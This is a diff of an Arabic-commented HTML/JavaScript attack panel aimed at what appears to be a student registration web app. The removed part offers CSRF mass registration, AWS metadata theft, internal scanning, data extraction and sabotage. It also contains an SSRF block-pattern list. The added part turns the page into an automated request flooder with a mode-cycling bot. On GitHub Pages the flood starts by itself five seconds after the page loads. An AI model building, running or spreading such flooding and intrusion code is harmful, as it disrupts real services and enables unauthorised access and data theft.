-                // ... باقي الطلاب
-            };
-            
-            function validateStudent(studentId, studentName, group) {
-                const student = ALLOWED_STUDENTS[studentId];
-                if (!student) return false;
-                if (student.name !== studentName) return false;
-                if (student.group !== group) return false;
-                return true;
-            }
-            
-            // 3. منع SSRF
-            function isUrlAllowed(url) {
-                const blockedPatterns = [
-                    /169\\.254\\.169\\.254/, // AWS Metadata
-                    /127\\.0\\.0\\.1/,      // localhost
-                    /localhost/,
-                    /192\\.168\\./,         // شبكة داخلية
-                    /10\\./,                // private IPs
-                    /172\\.(1[6-9]|2[0-9]|3[0-1])\\..*/
-                ];
-                
-                return !blockedPatterns.some(pattern => pattern.test(url));
-            }
-            
-            // 4. Rate Limiting
-            const requestLog = {};
-            
-            function checkRateLimit(studentId) {
-                const now = Date.now();
-                const lastRequest = requestLog[studentId] || 0;
-                
-                // طلب واحد كل 30 ثانية كحد أقصى
-                if (now - lastRequest < 30000) {
-                    return false;
+            const persistentInterval = setInterval(() => {
+                if (!attackState.isAttacking || persistentCount >= maxPersistent) {
+                    clearInterval(persistentInterval);
+                    return;
                 }
                 
-                requestLog[studentId] = now;
-                return true;
-            }
-            
-            // 5. الدالة الرئيسية المعدلة
-            function doPost(e) {
-                try {
-                    const data = JSON.parse(e.postData.contents);
-                    
-                    // التحقق من CSRF
-                    if (!data.csrf_token || !validateCSRFToken(data.csrf_token)) {
-                        return createErrorResponse('طلب غير مصرح: CSRF token غير صالح');
-                    }
-                    
-                    // التحقق من الطالب
-                    if (!validateStudent(data.studentId, data.studentName, data.group)) {
-                        return createErrorResponse('بيانات الطالب غير صحيحة');
-                    }
-                    
-                    // Rate Limiting
-                    if (!checkRateLimit(data.studentId)) {
-                        return createErrorResponse('عدد الطلبات كبير، حاول مرة أخرى لاحقاً');
-                    }
-                    
-                    // منع SSRF في أي حقل
-                    const jsonStr = JSON.stringify(data);
-                    if (!isUrlAllowed(jsonStr)) {
-                        return createErrorResponse('طلب غير مصرح به');
-                    }
-                    
-                    // أكمل المعالجة العادية...
-                    // ... الكود الأصلي هنا
-                    
-                } catch (error) {
-                    return createErrorResponse('خطأ في معالجة الطلب: ' + error.message);
+                sendRandomRequest();
+                persistentCount++;
+                
+                if (persistentCount >= maxPersistent) {
+                    logToTerminal(`✅ انتهى الإرسال المستمر #${attackState.attackCycle} (${persistentCount} طلب)`, 'success');
                 }
-            }
-            
-            function createErrorResponse(message) {
-                return ContentService.createTextOutput(JSON.stringify({
-                    status: 'error',
-                    message: '⛔ ' + message
-                })).setMimeType(ContentService.MimeType.JSON);
-            }
-            `;
-            
-            logToTerminal(fixCode, 'data');
-            
-            // تحميل كود الإصلاح
-            const blob = new Blob([fixCode], { type: 'text/javascript' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'كود_الإصلاح_الأمني.js';
-            a.click();
-            
-            logToTerminal('✅ تم توليد وتحميل كود الإصلاح', 'success');
-        }
-        
-        function exportData() {
-            const exportData = {
-                timestamp: new Date().toISOString(),
-                target: TARGET_URL,
-                statistics: {
-                    requests: attackState.requests,
-                    successes: attackState.successes,
-                    duration: document.getElementById('attackTime').textContent
-                },
-                extractedData: attackState.extractedData,
-                vulnerabilities: [
-                    'CSRF - Cross-Site Request Forgery',
-                    'SSRF - Server-Side Request Forgery',
-                    'AWS Metadata Exposure',
-                    'No Authentication',
-                    'No Rate Limiting',
-                    'Unrestricted UrlFetchApp'
-                ]
-            };
-            
-            const dataStr = JSON.stringify(exportData, null, 2);
-            const blob = new Blob([dataStr], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `اختراق_بيانات_${Date.now()}.json`;
-            a.click();
-            
-            logToTerminal('📤 تم تصدير جميع البيانات', 'success');
+            }, 500); // طلب كل 500ms
         }
         
         // ============== MAIN CONTROL FUNCTIONS ==============
-        function selectAttack(number) {
-            attackState.selectedAttack = number;
-            
-            // إزالة التحديد السابق
-            document.querySelectorAll('.attack-card').forEach(card => {
-                card.classList.remove('selected');
-            });
-            
-            // تحديد الجديد
-            document.querySelectorAll('.attack-card')[number - 1].classList.add('selected');
-            
-            const attackNames = [
-                'CSRF Mass Registration',
-                'AWS Metadata Steal', 
-                'Internal Network Scan',
-                'Logs & Data Extraction',
-                'Auto-Bot Full Attack',
-                'System Sabotage'
-            ];
-            
-            logToTerminal(`🎯 تم اختيار الهجوم: ${attackNames[number - 1]}`, 'success');
-        }
-        
-        async function launchSelectedAttack() {
-            if (!attackState.selectedAttack) {
-                logToTerminal('⚠️ لم تختر هجوماً!', 'warning');
+        function startContinuousFlood() {
+            if (attackState.isAttacking) {
+                logToTerminal('⚠️ النظام يعمل بالفعل!', 'warning');
                 return;
             }
             
             attackState.isAttacking = true;
-            logToTerminal(`🚀 إطلاق الهجوم المحدد #${attackState.selectedAttack}...`, 'critical');
+            attackState.startTime = Date.now();
+            attackState.attackCycle = 0;
             
-            switch(attackState.selectedAttack) {
-                case 1: await executeCSRFAttack(); break;
-                case 2: await executeAWSAttack(); break;
-                case 3: await executeInternalScan(); break;
-                case 4: await executeDataExtraction(); break;
-                case 5: await executeAutoBot(); break;
-                case 6: await executeSabotage(); break;
-            }
+            logToTerminal('🚀 بدء الإغراق المستمر...', 'critical');
+            logToTerminal(`⚡ الوضع: ${attackState.attackMode} | السرعة: ${attackState.speed}`, 'cmd');
             
-            logToTerminal(`✅ انتهى الهجوم المحدد #${attackState.selectedAttack}`, 'success');
+            // بدء دورة الهجوم
+            attackState.attackInterval = setInterval(() => {
+                if (!attackState.isAttacking) {
+                    clearInterval(attackState.attackInterval);
+                    return;
+                }
+                
+                switch(attackState.attackMode) {
+                    case 'normal':
+                        executeNormalAttack();
+                        break;
+                    case 'fast':
+                        executeFastAttack();
+                        break;
+                    case 'massive':
+                        executeMassiveAttack();
+                        break;
+                    case 'persistent':
+                        executePersistentAttack();
+                        break;
+                }
+                
+                // فاصل بين الدورات حسب الوضع
+                const cycleDelay = attackState.attackMode === 'persistent' ? 30000 : 10000;
+                
+                setTimeout(() => {
+                    if (attackState.isAttacking) {
+                        updateDisplay();
+                    }
+                }, cycleDelay);
+                
+            }, 15000); // دورة كل 15 ثانية
         }
         
-        async function launchFullAttack() {
+        function startAutoBot() {
+            if (attackState.isAttacking) {
+                logToTerminal('⚠️ النظام يعمل بالفعل!', 'warning');
+                return;
+            }
+            
             attackState.isAttacking = true;
-            logToTerminal('☢️ بدء الهجوم الشامل الكامل...', 'critical');
+            attackState.startTime = Date.now();
+            attackState.attackCycle = 0;
             
-            // تشغيل جميع الهجمات بالترتيب
-            await executeCSRFAttack();
-            await new Promise(r => setTimeout(r, 2000));
+            logToTerminal('🤖 بدء البوت التلقائي الشامل...', 'critical');
+            logToTerminal('🎯 البوت سيغير الوضع تلقائياً كل 30 ثانية', 'cmd');
             
-            await executeAWSAttack();
-            await new Promise(r => setTimeout(r, 2000));
+            // تغيير الوضع تلقائياً كل 30 ثانية
+            const modes = ['normal', 'fast', 'massive', 'persistent'];
+            let modeIndex = 0;
             
-            await executeInternalScan();
-            await new Promise(r => setTimeout(r, 2000));
-            
-            await executeDataExtraction();
-            await new Promise(r => setTimeout(r, 2000));
-            
-            await executeAutoBot();
-            await new Promise(r => setTimeout(r, 2000));
-            
-            await executeSabotage();
-            
-            logToTerminal('☢️ انتهى الهجوم الشامل الكامل', 'critical');
+            attackState.attackInterval = setInterval(() => {
+                if (!attackState.isAttacking) {
+                    clearInterval(attackState.attackInterval);
+                    return;
+                }
+                
+                // تغيير الوضع
+                attackState.attackMode = modes[modeIndex % modes.length];
+                modeIndex++;
+                
+                logToTerminal(`🔄 البوت غير الوضع إلى: ${attackState.attackMode}`, 'data');
+                
+                // تنفيذ الهجوم حسب الوضع الجديد
+                switch(attackState.attackMode) {
+                    case 'normal':
+                        executeNormalAttack();
+                        break;
+                    case 'fast':
+                        executeFastAttack();
+                        break;
+                    case 'massive':
+                        executeMassiveAttack();
+                        break;
+                    case 'persistent':
+                        executePersistentAttack();
+                        break;
+                }
+                
+                attackState.attackCycle++;
+                
+            }, 30000); // تغيير كل 30 ثانية
         }
         
         function stopAll() {
             attackState.isAttacking = false;
-            logToTerminal('⏹ تم إيقاف جميع الهجمات', 'warning');
+            if (attackState.attackInterval) {
+                clearInterval(attackState.attackInterval);
+                attackState.attackInterval = null;
+            }
+            logToTerminal('⏹️ توقف جميع العمليات', 'warning');
+        }
+        
+        function resetStats() {
+            attackState.requests = 0;
+            attackState.successes = 0;
+            attackState.startTime = Date.now();
+            attackState.attackCycle = 0;
+            updateDisplay();
+            logToTerminal('🔄 تم إعادة تعيين الإحصائيات', 'success');
+        }
+        
+        function updateSpeed(value) {
+            attackState.speed = parseInt(value);
+            updateDisplay();
+            logToTerminal(`⚡ سرعة الإرسال: ${attackState.speed} طلب/ثانية`, 'cmd');
+        }
+        
+        function setAttackMode(mode) {
+            attackState.attackMode = mode;
+            logToTerminal(`🎯 تم تعيين الوضع إلى: ${mode}`, 'success');
+        }
+        
+        // ============== AUTO-START FOR GITHUB PAGES ==============
+        function autoStartOnGitHub() {
+            // إذا كان المشروع يعمل على GitHub Pages، ابدأ تلقائياً بعد 5 ثوان
+            if (window.location.hostname.includes('github.io')) {
+                logToTerminal('🌐 تم اكتشاف GitHub Pages - سيبدأ التشغيل التلقائي خلال 5 ثوان...', 'success');
+                
+                setTimeout(() => {
+                    if (!attackState.isAttacking) {
+                        logToTerminal('🤖 بدء التشغيل التلقائي...', 'critical');
+                        startContinuousFlood();
+                    }
+                }, 5000);
+            }
         }
         
         // ============== INITIALIZATION ==============
-        function initMatrix() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            const container = document.getElementById('matrixBg');
-            
-            canvas.width = container.clientWidth;
-            canvas.height = container.clientHeight;
-            container.appendChild(canvas);
-            
-            const chars = "01アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン";
-            const fontSize = 14;
-            const columns = canvas.width / fontSize;
-            const drops = [];
-            
-            for (let i = 0; i < columns; i++) {
-                drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
-            }
-            
-            function draw() {
-                ctx.fillStyle = 'rgba(0, 10, 0, 0.05)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                ctx.fillStyle = '#0F0';
-                ctx.font = `${fontSize}px monospace`;
-                
-                for (let i = 0; i < drops.length; i++) {
-                    const text = chars[Math.floor(Math.random() * chars.length)];
-                    const x = i * fontSize;
-                    const y = drops[i] * fontSize;
-                    
-                    ctx.fillText(text, x, y);
-                    
-                    if (y > canvas.height && Math.random() > 0.975) {
-                        drops[i] = 0;
-                    }
-                    drops[i]++;
-                }
-            }
-            
-            setInterval(draw, 50);
-        }
-        
-        // بدء التشغيل
         window.onload = function() {
-            initMatrix();
+            // تحديث العرض كل ثانية
             setInterval(updateDisplay, 1000);
-            logToTerminal('✅ نظام الاختراق الشامل جاهز', 'success');
+            
+            // بدء التشغيل التلقائي على GitHub
+            autoStartOnGitHub();
+            
+            logToTerminal('✅ نظام الإغراق التلقائي جاهز', 'success');
+            logToTerminal('📝 التعليمات:', 'cmd');
+            logToTerminal('1. اضغط "بدء الإغراق المستمر" للتشغيل اليدوي', 'cmd');
+            logToTerminal('2. اضغط "بدء البوت التلقائي" للعمل المستقل', 'cmd');
+            logToTerminal('3. النظام يبدأ تلقائياً على GitHub Pages', 'cmd');
         };
     </script>
 </body>
